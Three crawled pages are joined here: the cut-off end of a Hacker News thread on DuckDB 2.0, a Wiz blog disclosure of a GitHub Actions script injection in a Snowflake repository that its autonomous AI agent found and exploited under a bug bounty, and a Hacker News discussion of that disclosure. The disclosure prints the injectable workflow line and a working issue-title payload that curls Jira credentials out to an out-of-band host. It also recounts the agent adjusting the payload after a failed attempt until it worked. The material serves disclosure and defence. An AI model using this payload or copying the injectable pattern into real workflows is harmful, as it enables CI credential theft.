+I'm using duckdb/duckdb-go as query engine for my Go services: moving hot data from Postgres to Parquet files on S3 or to Iceberg; querying cold data on Iceberg, ... instead of using different Go libraries.
+reply
+tccole
+14 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Yes.
+I have used it with WASM for some web applications for web use. I have also used with locally for querying 100 gigs of data. And I have used it in the cloud as the serverless gold layer for Apache superset.
+reply
+peesem
+14 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+maybe a niche use case but i've found it's perfect to store & query random trivia/gameshow questions based on filters for my personal clones of things like Family Feud and Jeopardy
+reply
+malshe
+10 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I use it locally with parquet files
+reply
+arpinum
+13 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+ETL from DynamoDB into Ducklake
+reply
+fifilura
+16 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+My favourite is AWS Athena (backed by Trino).
+"If we use this we get indefinite RAM indefinite CPU and do not need to host a server".
+I had an impression that DuckDB was not great at distributing work to other machines, but good at doing it locally? Am I wrong?
+reply
+abirch
+15 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+DuckDB out of the box may not be great. But you have DuckLake, Quack, and even DeepSeek made their own distributed DB based on DuckDB:
+https://github.com/deepseek-ai/smallpond
+reply
+jtbaker
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I don't think DuckDB itself can coordinate work across multiple nodes. But you could put it behind an HTTP layer and scale horizontally based on resource utilization?
+reply
+ericpauley
+16 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Athena + Clickhouse has been an absolute game changer for us. Perfect combo for OLAP + deeper filtering that we can’t necessarily pre-index for.
+reply
+MILP
+28 minutes ago
+|
+prev
+|
+next
+[–]
+Love DuckDB. It’s so fast and portable! I mainly use the query engine as part of my ETL process for creating SQLite database. I’d love to pitch it at work, but we’re heavily invested in BigQuery, which makes it a bit difficult.
+reply
+therealdrag0
+10 hours ago
+|
+prev
+|
+next
+[–]
+Hate to bring it up, but 10,000 commits in less than 6 months is a lot. Is AI a major contribute here?
+Is AI use for accelerated development of a beloved tool like DuckDB enough to quiet lingering doubters?
+reply
+nh2
+8 hours ago
+|
+parent
+|
+next
+[–]
+If you merge PRs that have commit mesages like this, it's easy to arrive at 10000 commits in 6 months:
+rename to NodePointer instead
+format
+Revert "format"
+Revert "rename to NodePointer instead"
+rename to OptionalNodePtr
+woops
+update comment
+slot renames
+more renames
+Source:
+https://github.com/duckdb/duckdb/pull/23605
+If every Ctrl+S is a commit, it'll go up fast.
+"woops"!
+reply
+Mic92
+4 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+They seem to squash PRs using the pr description as commit message. So this sounds like a good approach to me.
+reply
+mastermage
+1 hour ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+i love woops
+reply
+ivolimmen
+2 hours ago
+|
+prev
+|
+next
+[–]
+I am a crew member of Joy Of Coding (
+https://joyofcoding.org
+) where we invited Hannes to do a talk. He is a great speaker. Seeing this we will need to invite him another time!
+reply
+jinjin2
+2 hours ago
+|
+prev
+|
+next
+[–]
+I’m mostly using Exasol these days (the concurrency and smooth scaling to multi-node is just too seductive), but with the introduction of Quack I might take another look at DuckDB. I’ll have to see how well it handles many agents reading and writing to it concurrently.
+reply
+dm03514
+8 hours ago
+|
+prev
+|
+next
+[–]
+<3 duckdb run realtime analytics pipeline using a (moderately popular) stream processing engine I built on top of DuckDB. Looking forward to what duckdb provides in terms of perf out of the box!
+https://github.com/turbolytics/sql-flow
+DuckDB has been a fantastic engine to build on (in python), and processes thousands of events per second, day in an day out, without issue
+reply
+srameshc
+17 hours ago
+|
+prev
+|
+next
+[–]
+I <3 DuckDB. It has become one of my go to tools for storing, data processing , integrations and now even graph. More importantly it's fun to use because it is so portable. Looking forward to v2.
+reply
+fragebogen
+17 hours ago
+|
+parent
+|
+next
+[–]
+Ditto! Very happy with the upcoming async support! Now it'll be a nice little db for serving http traffic as well!
+reply
+d3Xt3r
+10 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+What advantages does it have over SQLite in your use cases? Can you give any examples?
+reply
+briHass
+8 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Not OP, but for me, the lack of essentially any type system in SQLite makes it a total no-go for storing data long-term or that more than one application needs to access. Date/time being an especially painful footgun in SQLite.
+I view SQLite as something a single application can use for storing state/settings/misc operational data instead of directly writing files, especially if the data being stored is relational or needs ACID. As soon as the data itself has meaning and structure per se, you're better off with something that can help enforce and describe the data: rich datatypes, foreign keys that aren't optional, etc.
+reply
+remywang
+12 hours ago
+|
+prev
+|
+next
+[–]
+If you like DuckDB, please consider funding DB research [1]!
+[1]:
+https://news.ycombinator.com/item?id=49336147
+reply
+gw32
+6 hours ago
+|
+prev
+|
+next
+[–]
+> The VARIANT type shipped in DuckDB v1.5, and the way to think about it is JSON on steroids. Basically, imagine if JSON were fast. [...] DuckDB automatically detects the common structure hidden in your semi-structured data and “shreds” it, so it compresses well in storage
+I am really looking forward to this hitting v2.0. I can't stand uncompressed JSON - so space-inefficient. But heterogenous JSON in parquet files is such a pain because of schema differences causing fields to be silently dropped. Having DuckDB solve this is exactly what I've been looking for.
+reply
+mastermage
+1 hour ago
+|
+prev
+|
+next
+[–]
+I love DuckDB genuinely more than sqlite even though they do completely different things but DuckDB has like for me the perfect mix between simplicity, embedded capabilities and expressiveness. (and actual Time and Date Types).
+reply
+aleda145
+15 hours ago
+|
+prev
+|
+next
+[–]
+Excited about a stable C++ API for extensions!
+I made a dry run extension a few months ago (
+https://github.com/aleda145/duckdb-dryrun
+), will be so nice to build it just once and know that it will always work.
+Also urge anyone to make an extension, the template makes it quite smooth:
+https://github.com/duckdb/extension-template
+reply
+c9cf35860db4
+17 hours ago
+|
+prev
+|
+next
+[–]
+The last year of DuckDB enhancements feel like the shift from in-process execution engine (which it is phenomenal at) to an engine that can serve as the foundation of a cloud data warehouse. I know the founders were reticent about not wanting to build that, but I have a feeling it is in the works.
+reply
+jbmsf
+17 hours ago
+|
+parent
+|
+next
+[–]
+I've been using MotherDuck as a data warehouse for some time now. No regrets.
+reply
+ethagnawl
+16 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+UPDATE: Removed uninformed comment about the relationship between DuckDB and MotherDuck.
+reply
+Tomte
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Wait, what? I‘ve always assumed MotherDuck is the company by the main developers of DuckDB? They are unrelated?
+reply
+ethagnawl
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I was wrong. Apologies.
+> They decided to work together, and DuckLabs would become a co-founder of the new endeavor.
+https://motherduck.com/about-us/
+reply
+jeremyjh
+12 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+They launched ducklake:
+https://ducklake.select/
+reply
+amluto
+16 hours ago
+|
+prev
+|
+next
+[–]
+If I could have a pet feature added to DuckDB, it would be some form of native ordered table. In a database like Clickhouse or any of the dedicated time series DBMSes or log stores, there’s a built-in concept that a table might have an order, and the database will optimize based on the order.  But, for databases that are logically just bags of rows (traditional DBMSes and also DuckDB [0]), you either need an index or you need to rely on full table scans or at least scans of big blocks. DuckDB does the latter really well, but I think it would be quite nice for some workflows to have explicit ordering. Also, I bet compression could work a lot better with ordering hints.
+All that being said, I’m quite excited about DuckDB 2.0. I want to give the improved VARIANT support a try.
+[0] Documentation on DuckDB’s native format is rather sparse AFAICT. But the DDL has nothing resembling an ordered table.
+reply
+tpetry
+11 hours ago
+|
+parent
+|
+next
+[–]
+You‘re not the only one interested in this. But seems its a big change that would have to change many parts within DuckdB:
+https://github.com/duckdb/duckdb/discussions/8444
+reply
+amluto
+11 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Neat!
+I’m sort of amazing that nothing in that thread mentioned ClickHouse, even just as a product that has this capability and from which one might take syntactical inspiration.
+reply
+ignaciovdk
+14 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Arc does pruning, and make that scan faster. Check it out:
+https://github.com/Basekick-Labs/arc
+reply
+noodlesUK
+14 hours ago
+|
+prev
+|
+next
+[–]
+I look forward to DuckDB being the engine that underpins the next gen of analytical data tooling. DuckLake already looks amazing and with the Quack protocol seems like it will be a great natural fit for lots more types of tooling, such as sensor data etc.
+reply
+dangoodmanUT
+9 hours ago
+|
+prev
+|
+next
+[–]
+It's funny to me that we still don't have incremental materialized views. All of the parts are there (export state, agg_state (forget fn name), finalize). I wonder if they're avoiding an explicit war with clickhouse or something. I do recall they mentioned they want to add this to ducklake.
+Incremental MVs are ClickHouse's best feature. If DDB adds this, the last moat is distributed query execution.
+reply
+hantusk
+1 hour ago
+|
+parent
+|
+next
+[–]
+It is implemented here as DuckDB extension:
+https://github.com/ila/openivm/
+reply
+ghshephard
+8 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Have you run into scenarios where a simple view doesn't accomplish what you require?   I always feel like views do everything I want - because the speed is so great, the full recompute isn't that big a deal.
+Maybe it's a bigger deal when you have multiple users/and or more repeated queries against something that's really expensive?
+reply
+Pedro_Ribeiro
+7 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I've had some use cases with low latency requirements and frequent data updates. If you want to serve data on a frontend fast it's often not feasible to recompute everything every time
+reply
+barrrrald
+11 hours ago
+|
+prev
+|
+next
+[–]
+We've built our whole platform around DuckDB at Hex. Our product truly could not exist without it.
+reply
+nikolay
+11 hours ago
+|
+prev
+|
+next
+[–]
+It's sad that almost no migration framework supports DuckDB, and overall support is highly limited, but it's a great product I've been using daily for 6 months without encountering a single issue. I hope v2 brings DuckDB more attention and increases third-party support!
+reply
+andyferris
+7 hours ago
+|
+prev
+|
+next
+[–]
+I was curious to see they are advertising OLTP-like transactional processing speed. It would be super convenient to have one DB for OLTP and OLAP purposes!
+Has anybody here tried using it that way?
+(though I don't see any way to deal with write skew and other transactional guarantees - no SERIALIZABLE optimisitic concurrency, no SELECT FOR UPDATE pessimistic concurrency, etc)
+reply
+rrgok
+12 hours ago
+|
+prev
+|
+next
+[–]
+Sometimes I prefer DuckDB query language to MySQL or Postgres. It is not even about performance, it just feels right. I just connect to my DBS from DuckDB just to use its query language. And besides it gives you a single language frontend.
+reply
+onnimonni
+11 hours ago
+|
+parent
+|
+next
+[–]
+This! For example I tried to ask PosgreSQL to Add support for QUALIFY keyword since it makes window queries much more simpler to use. Postgres didnt want it. DuckDB maintainers are always thinking about the DX and all nice syntactic sugar.
+reply
+hans_castorp
+11 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+The Postgres devs rejected it, because it wasn't part of the standard back then, and apparently work was going on, to include it into the standard.
+Now that it's included in the standard, there is work to implement it:
+https://hackorum.dev/topics/51960#message-1125429
+reply
+anentropic
+16 hours ago
+|
+prev
+|
+next
+[–]
+Please document the new "extensible PEG-based parser" for extension authors
+reply
+luizfelberti
+10 hours ago
+|
+prev
+|
+next
+[–]
+> A repository is a name, a URL prefix, and one or more RSA public keys that are trusted to sign the extensions served from it.
+Is it too late to beg Hannes and Mark to let us have something like minisign instead of RSA? :)
+Very excited for 2.0, congrats folks!
+reply
+drannex
+15 hours ago
+|
+prev
+|
+next
+[–]
+Really looking forward to that new Async system, especially when reading/querying against thousands of parquet files. This is going to monumentally affect me and my work - I have to query against millions of massive parquet files and the speed has already been rather wonderful, but if those metrics are to be even 100% in range, this is going to make life so much better.
+DuckDB is seriously an incredible utility.
+reply
+logancbrown
+16 hours ago
+|
+prev
+|
+next
+[–]
+Funny to think one of my favorite software projects this decade is basically "lets make it easy to host your own OLAP database".
+reply
+HawtAds
+11 hours ago
+|
+prev
+|
+next
+[–]
+How stable is DuckDB these days? I remember it was very buggy compared to Clickhouse.
+reply
+est
+17 hours ago
+|
+prev
+|
+next
+[–]
+This is cool
+What about the runtime size? I care this because I intend to run a stripped WASM version of DuckDB in browser.
+reply
+zcw100
+16 hours ago
+|
+parent
+|
+next
+[–]
+What do you plan on stripping and what's your target? The Emscripten based build is ~10Mb. I have a component build so I'd be interesting on how you'd like to break it up.
+reply
+datadrivenangel
+14 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+They're mostly using optional extensions for this new stuff, so the binaries are still small, like ~20mb?
+reply
+d33
+14 hours ago
+|
+prev
+|
+next
+[–]
+Are there improvements in how memory_limit works? I often had DuckDB get OOM killed because it went beyond its limit. It's definitely one of the reasons why I usually have an AI tune the environment for my datasets.
+reply
+ChillyCapy
+12 hours ago
+|
+prev
+|
+next
+[–]
+Great work!
+I built a browser tool for querying local Parquet, CSV, JSON, Excel, Arrow, Avro, DBF, and SQLite files with DuckDB-WASM.
+Most probably after DuckDB v2.0 release I will revamp my tool as well.
+reply
+thejosh
+14 hours ago
+|
+prev
+|
+next
+[–]
+I've been working on a demo database project, and have been really impressed by the UI. So glad they decided to put more effort into it, it has made building a "follow along" tutorial really nice.
+reply
+sv123
+16 hours ago
+|
+prev
+|
+next
+[–]
+DuckDB is so cool, game changer when it comes to local data processing.
+reply
+cheema33
+12 hours ago
+|
+prev
+|
+next
+[–]
+With some of these changes, it appears to be encroaching on clickhouse territory. Or are they still very different products?
+reply
+te_chris
+12 hours ago
+|
+parent
+|
+next
+[–]
+Well, I can tell you this is making me actively reconsider dropping duckdb for ch as we go from prototype to prod
+reply
+encoderer
+12 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Definitely encroaching.
+Our last product (SaaS observability) uses Clickhouse.
+Our next product (self-hosted observability) uses DuckDB.
+reply
+orthoxerox
+13 hours ago
+|
+prev
+|
+next
+[–]
+DuckDB keeps getting better and better. I wonder when something like Apache Gluten will pick it up as a backend.
+reply
+dzonga
+14 hours ago
+|
+prev
+|
+next
+[–]
+well done to the duckDB team - one of the features I'm waiting for is real time materialized views.
+reply
+markhalonen
+17 hours ago
+|
+prev
+|
+next
+[–]
+Was hoping to see procedural functionality like PL/pgSQL... regardless, an astonishing project overall.
+reply
+brunoborges
+14 hours ago
+|
+prev
+|
+next
+[–]
+How does DuckDB compares with PostgreSQL / MariaDB ?
+reply
+tuvix
+14 hours ago
+|
+parent
+|
+next
+[–]
+DuckDB is an in-process (now I guess less so with Quack) OLAP database for analytical workloads. PostgreSQL or MariaDB are OLTP row-oriented databases that are great for application/transaction-focused workloads but are less great when you want to query across a giant amount of data.
+reply
+tomjakubowski
+13 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+DuckDB is much like SQLite, but built for OLAP workloads: it's in-process, with a single file format on a disk, and (unlike SQLite) the data is stored in columns for better OLAP performance.
+Like SQLite, concurrency options are limited compared to client-server databases like Postgres or MariaDB. DuckDB 2.0 will be adding a client-server mode with the Quack protocol which can allow for greater concurrency.
+But you can also use DuckDB as a multitool to connect to and query all kinds of other data sources from one connection. Being able to pull in data from Postgres, CSVs or parquets on a file system or S3, and JSON returned by a web API, and then query across all of it in one place, can be quite handy for ad-hoc data analysis and exploration.
+reply
+formerly_proven
+13 hours ago
+|
+prev
+|
+next
+[–]
+In terms of project trajectory this is also an interesting contrast. Duc
+
+=== wiz https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug ===
+Red Agent Exploits Snowflake Vuln Missed by Github Copilot | Wiz Blog
+Sign in
+Experiencing an incident?
+Wiz
+Pricing
+Get a demo
+Platform
+Solutions
+Pricing
+Resources
+Customers
+Company
+Get a demo
+Blog
+Wiz Red Agent Finds Its Way Into Snowflake’s Internal Jira Through a Flaw in a GitHub Copilot–Assisted PR
+Wiz Red Agent independently discovered and exploited a GitHub Actions injection missed by GitHub’s Advanced Security, validated access to sensitive data in Snowflake’s internal Jira, and assessed the blast radius—all without human intervention, five days after the flaw became live.
+State of AI in the Cloud Report 2026
+Get a demo
+Gal Nagli
+August 17, 2026
+|
+As part of ongoing security research conducted through Snowflake’s HackerOne vulnerability disclosure program, Wiz Research’s "Red Agent"—an autonomous, AI-powered security research tool—identified a critical GitHub Actions workflow vulnerability in one of Snowflake’s public repositories.
+This incident highlights a new reality in software development:
+Critical vulnerabilities can still be introduced and approved within workflows involving AI coding agents and can still pass established automated security checks, while autonomous AI security agents can rapidly discover and exploit them in the wild.
+Upon responsible disclosure on June 23, 2026 by Wiz, Snowflake remediated the vulnerability on the same day, rotated the affected credential, and verified via detailed audit logs that Wiz was the sole actor during the exposure window. Wiz confirmed that all data accessed during proof-of-concept testing was securely deleted.
+August 17, 2026, 1957 UTC update: This blog has been updated to clarify that Copilot was a co-author that checked the merged PR and code change, and identified it as all-clear without noticing the critical vulnerabilities. It's unclear whether the code-change was AI-assisted.
+Executive Summary
+Wiz Red Agent identified a script injection vulnerability in
+snowflakedb/snowflake-connector-net
+. The issue allowed an unauthenticated user to execute arbitrary commands within a GitHub Actions runner by opening a GitHub issue with a specially crafted title.
+Crucially, the vulnerability became live on June 18, 2026 - just five days before its discovery - when
+PR #1218
+was merged. GitHub Advanced Security scan analyzed the final PR revision, including the vulnerable workflow, but did not flag the critical injection.
+Screenshot demonstrating access to Snowflake's Jira portal, via an exfiltrated token
+Exposure Walk-Through
+Discovery
+Wiz Red Agent's CI/CD capability scanned Snowflake's GitHub organization and flagged the
+jira_issue.yml
+Workflow in
+snowflakedb/snowflake-connector-net
+as vulnerable to script injection via untrusted input in
+run:
+blocks.
+The Code Change
+-
+env
+:
+-
+ISSUE_TITLE
+:
+${{ github.event.issue.title }}
+-
+run
+:
+jq -n --arg title "$ISSUE_TITLE" ...
++ run
+:
+TITLE=$(echo '${{ github.event.issue.title }}' | sed ...)
+The workflow triggered on
+issues: opened
+- meaning any GitHub user could fire it by opening an issue - and interpolated the attacker-controlled issue title directly into a shell script:
+run
+:
+|
+TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g")
+The
+sed
+escaping runs after GitHub's template expansion, a single quote in the title breaks out of
+echo '...'
+and allows arbitrary command execution.
+The injectable pattern was added to jira_issue.yml in commit 094038e and became live when PR #1218 was squash-merged as
+commit 4a1b8ce
+(
+PR #1218: “SNOW-2069227: Update jira workflows”
+). Copilot Autofix’s documented contribution was a separate fix to jira_close.yml within the same PR. GitHub Advanced Security’s scan explicitly extracted the vulnerable jira_issue.yml workflow but did not flag the injection. The merged PR removed the repository’s existing safe env: and jq pattern and replaced it with direct ${{ github.event.issue.title }} interpolation, creating the injection vector.
+The commit introducing the vulnerable pattern
+The code change introducing the vulnerable pattern
+The Open “Security Gate”
+The workflow had an
+if:
+condition that appeared protective:
+if
+:
+(github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')
+However, on issues events,
+github.event.pull_request
+is always
+null
+.
+So the condition reduces to (
+null != 'whitesource-for-github-com[bot]'
+). This is always true, and every GitHub user passes the gate.
+The Open “Security Gate”
+Exploitation
+We crafted an issue title that, after template expansion, breaks out of the echo string and exfiltrates the Jira credentials via an out-of-band callback:
+Crucially, when Red Agent’s cicd capability initially attempted exfiltration using a standard comment character (
+#
+), the runner returned a bash syntax error because the comment consumed the closing parenthetical of
+TITLE=$(...)
+. Rather than stopping or failing, Red Agent:
+autonomously analyzed the syntax execution error
+adjusted its payload to use
+; echo '
+to properly close the shell block, and
+successfully received the out-of-band callback
+' ; curl -s "https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`&e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&u=`printf %s $JIRA_BASE_URL|base64 -w0`" ; echo '
+Within seconds, our listener received the callback from a GitHub Actions runner (Azure IP
+20.106.182.197
+) containing base64-encoded credentials.
+The POC PR with payload in the Issue title
+Note:
+Our first attempt used
+#
+to comment out the rest of the line, which caused an unexpected EOF bash error because it also ate the closing
+)
+of
+TITLE=$(...)
+. The fix was using
+; echo '
+to properly close the shell syntax.
+The workflow log showing successful exploitation
+The exfiltrated token linked to qa@snowflake.net
+The exfiltrated token authenticated as
+qa@snowflake.net
+to
+snowflakecomputing.atlassian.net
+, granting read access across Snowflake's engineering, security compliance, and bug bounty tracking projects.
+Remediation & Forensics
+Same-Day Patching:
+Snowflake patched the workflow on June 23, 2026 (
+1dc7766
+, PR #1402), fully restoring the safe
+env:
+variable and
+jq --arg
+parsing pattern.
+Credential Revocation:
+The JIRA token in question was revoked and rotated.
+Forensic Verification:
+Comprehensive audit log analysis confirmed that no external third parties accessed the endpoint during the 5-day exposure window. All anomalous queries were strictly matched to Wiz's testing IPs.
+Key Takeaways
+AI Code Generation Demands Rigorous Oversight:
+AI coding tools predict code based on probabilistic patterns, which can inadvertently reintroduce deprecated or insecure shell patterns. AI-generated PRs must undergo the same static analysis and security scrutiny as human code.
+Collapsing Discovery Windows:
+The vulnerability was live for only five days before an automated agent discovered and validated it. Security operations must adapt to a landscape where automated discovery occurs in hours, requiring rapid patch cycles and short-lived credentials.
+Preventing CI/CD Security Regressions:
+Security intent can be lost when safer code patterns are not explicitly enforced. In this incident, the merged PR removed a safe env: + jq parsing pattern and replaced it with direct string interpolation, while the existing security solution failed to flag the resulting injection that led to the exposure.
+Disclosure Timeline
+June 18, 2026 -
+The vulnerability became live when PR #1218 was merged.
+June 23, 2026
+- Wiz identified, exploited, and reported vulnerability to Snowflake via HackerOne (report #3819931)
+June 23, 2026
+- Slack notification sent to Snowflake security team
+June 23, 2026 (same day)
+- Snowflake patches the vulnerable script-injection workflow (
+commit 1dc7766
+,
+PR #1402
+), restoring the safe
+env:
++
+jq --arg
+pattern.
+June 24, 2026
+- Jira token rotated
+July 25, 2026
+- Public disclosure deadline (30 days after the June 25 resolution, per Snowflake’s disclosure policy)
+Snowflake’s Response
+Snowflake appreciates Wiz's responsible reporting of and collaboration around these findings through our vulnerability disclosure and bug bounty program, HackerOne. Wiz Research reported a security vulnerability in one of Snowflake's public GitHub repositories. The disclosure was received on June 23, 2026, and it was immediately investigated and remediated, and our investigation found no evidence of unauthorized access. Protecting our systems remains a top priority, and we remain committed to continually strengthening our software development and security practices. We are working together with Wiz to share these learnings with the broader industry to encourage widespread adoption of these security best practices.
+Tags
+#
+Research
+#
+AI
+#
+Wiz Agents
+Table of contents
+Executive Summary
+Exposure Walk-Through
+Discovery
+The Open “Security Gate”
+Exploitation
+Remediation & Forensics
+Key Takeaways
+Disclosure Timeline
+Snowflake’s Response
+State of AI in the Cloud 2026
+We tap into data from real cloud environments to explore the rapid adoption of AI technologies and how security teams should respond.
+Get the Report
+Continue reading
+The Closed Loop Remediation Playbook with Wiz
++
+3
+Eyal Golombek
+,
+Guy Mast
+,
+Erez Talgam
+and 3 more
+August 17, 2026
+Start your path to a self-healing cloud today, with Wiz Workflows now GA and Remediation and Response in public preview.
+Wiz on Wiz: How the Wiz FinOps Team Uses Wiz Cloud Cost
++
+2
+Ron Tzrouya
+,
+Guy Aharon
+,
+Noa Manor
+and 2 more
+August 14, 2026
+Powering cost investigation and optimization with deep cloud context
+Securing Data in the AI era
+Snegha Ramnarayanan
+,
+Shachar Horvitz
+,
+Noa Azaria
+,
+Chad Knipschild
+August 14, 2026
+AI is changing the context around data risk, making it critical to understand what’s connected, what’s exposed, and why.
+Get a personalized demo
+Ready to see Wiz in action?
+"Best User Experience I have ever seen, provides full visibility to cloud workloads."
+David Estlick
+CISO
+"Wiz provides a single pane of glass to see what is going on in our cloud environments."
+Adam Fletcher
+Chief Security Officer
+"We know that if Wiz identifies something as critical, it actually is."
+Greg Poniatowski
+Head of Threat and Vulnerability Management
+Get a demo
+Footer
+Platform
+Cloud & AI Security
+Wiz Code
+Wiz Cloud
+Wiz Defend
+Integrations
+Environments
+Documentation
+Learn
+Customer Stories
+Cloud Security Courses
+Blog
+CloudSec Academy
+Resources Center
+Cloud Threat Landscape
+Cloud Security Assessment
+Vulnerability Database
+Company
+About Wiz
+Join the Team
+Newsroom
+Events
+Contact Us
+Trust Center
+Wiz Partner Alliance
+X
+LinkedIn
+Bluesky
+RSS
+©
+2026
+Wiz, Inc.
+Status
+Privacy Policy
+Terms of Use
+Modern Slavery Statement
+Cookie Settings
+English (US)
+
+=== hn-wiz https://news.ycombinator.com/item?id=49331423 ===
+AI-Generated GitHub Copilot “Autofix” Allowed Compromise of Snowflake's Jira | Hacker News
+Hacker News
+new
+|
+past
+|
+comments
+|
+ask
+|
+show
+|
+jobs
+|
+submit
+login
+AI-Generated GitHub Copilot “Autofix” Allowed Compromise of Snowflake's Jira
+(
+wiz.io
+)
+365 points
+by
+galnagli
+18 hours ago
+|
+hide
+|
+past
+|
+favorite
+|
+141 comments
+help
+inahga
+16 hours ago
+|
+next
+[–]
+I probably would have made the same mistake. It is negligent to write GitHub Actions without using static analysis.
+Use zizmor in CI
+https://github.com/zizmorcore/zizmor
+error[template-injection]: code injection via template expansion
+--> .github/workflows/jira_issue.yml:24:29
+|
+22 |         run: |
+|         --- this run block
+23 |           # Escape special characters in title and body
+24 |           TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g")
+|                             ^^^^^^^^^^^^^^^^^^^^^^^^ may expand into attacker-controllable code
+|
+= note: audit confidence → High
+= note: this finding has an auto-fix
+reply
+btown
+16 hours ago
+|
+parent
+|
+next
+[–]
+This is a really cool tool! Would zizmor have caught the below as well? From the article:
+> The workflow had an if: condition that appeared protective:
+> if: (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')
+> However, on issues events, github.event.pull_request is always null. So the condition reduces to (null != 'whitesource-for-github-com[bot]'). This is always true, and every GitHub user passes the gate.
+Speaking broadly: it's a massive reminder that AI is trained on a veritable mountain of insecure GitHub Actions examples, many of which "fail open" in highly unpredictable ways even if widely used. Actions is almost unique in this regard, with the combination of a difficult-to-audit language and the type of privileged RCE environment that makes attackers salivate.
+(I do think that this stems in part from GitHub's often-inscrutable documentation, and a decision to release Actions without a robust security linting solution, leaving that to the community - but I do understand how it's an uphill battle, and we could have ended up with a much less flexible CI/CD system without this having shipped fast.)
+reply
+woodruffw
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+zizmor wouldn’t catch that condition at the moment, although it does have similar checks for other unsound conditions and incorrect/vulnerable bot actor checks. This one wouldn’t be too hard to add, though.
+(Source: I am zizmor’s maintainer.)
+reply
+btown
+13 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+That would be awesome - and thanks for your work, I'll want to start using it!
+Nullable event payloads silently null-coalescing to '' are a real "spooky action at a distance" kind of issue, because something that works perfectly when running and being QA'd on PRs, can silently fall apart if made to also run on the main/develop branch (which is only really monitored if the "build breaks," and thus a silent failure or skip might easily sneak through).
+Our codebase indeed has comments like this, without which we'd be totally lost:
+# Note contains('') is false if there is no PR at all e.g. on a push to develop,
+# so this will always run on pushes to the develop branch.
+if: ${{ !contains(github.event.pull_request.labels.*.name, 'ci-skip-backend') }}
+I imagine that's true of others as well!
+reply
+IshKebab
+5 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Frankly it's absurd that you don't get a null reference error in that case. I knew Github Actions was bad... I didn't know it was
+that
+bad. This is 90% Github's fault.
+reply
+saghm
+14 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Shell scripts on their own already are so perilous without static analysis. I'll never understand how we ended up deciding that embed them in yaml instead of requiring an external script file was a reasonable idea.
+reply
+fizlebit
+6 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+yeah it is so mad:
+TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g")
+Even in ruby it would have been something like
+TITLE=shell_escape(github.event.issue.title)
+where shell_escape could at least have unit tests. I don't know anything about github actions, but anything that takes user input needs to be processed with a language that uses static typing I believe to help ensure that the user input doesn't get into expressions given to other programs, shell, sql, or whatever.
+Unix was just not made for this sort of thing. It was made for in-house people to write patent applications.
+reply
+frollogaston
+3 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Bash script embedded in yaml. Wow, I'd view each of those with heavy suspicion on its own, and they're nonlinearly bad together because of how special chars interact.
+reply
+jiggawatts
+3 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+YAML seems reasonable because it allows the sequence of steps to be treated as
+data
+, which then enables GUI visualisation, introspection, etc...
+without
+actually having to run anything.
+That's critical for a platform like GitHub and for devops pipelines in general.
+The failure is that "data" ends up being a "terrible custom DSL" that is bad at everything: Not good at data, not a good DSL, and not even a proper programming language.
+The best approaches I have seen to this kind of thing are:
+- Pulumi: You get to run custom code, but it
+outputs data
+. In other words, your "build automation script" must be a pure function taking data in and returning data out. The resulting data is then treated as the "thing" that the pipeline executes, which means that all decisions (parameters, inputs, etc...) have to be "baked in", before the pipeline starts executing.
+- Google CUE (Configure Unify Execute): lets you build up JSON using a strongly typed constraint language. Great for huge, complex configuration.
+reply
+verdverm
+22 minutes ago
+|
+root
+|
+parent
+|
+next
+[–]
+nit, CUE is independent from Google now, Marcel left to work on it full time years ago with some other folks, they started a company
+reply
+brewmarche
+15 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+I get scared when I see these string interpolations in GitHub Actions.
+Use `env:` instead and just work with environment variables in your shell script.
+Yes, you still need to vet your script. Quoting is a common source of problems. Use shellcheck. Do not call eval/source/python/perl/whatever with untrusted input.
+But you removed one layer of problems already by not pasting a value into your shell script code directly.
+reply
+codedokode
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+There should be an array of arguments instead of space-separated string.
+reply
+netdevphoenix
+15 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Difference is you are not a trillion dollar plus technology hyped as a harbinger of civilisational change.
+reply
+bonoboTP
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
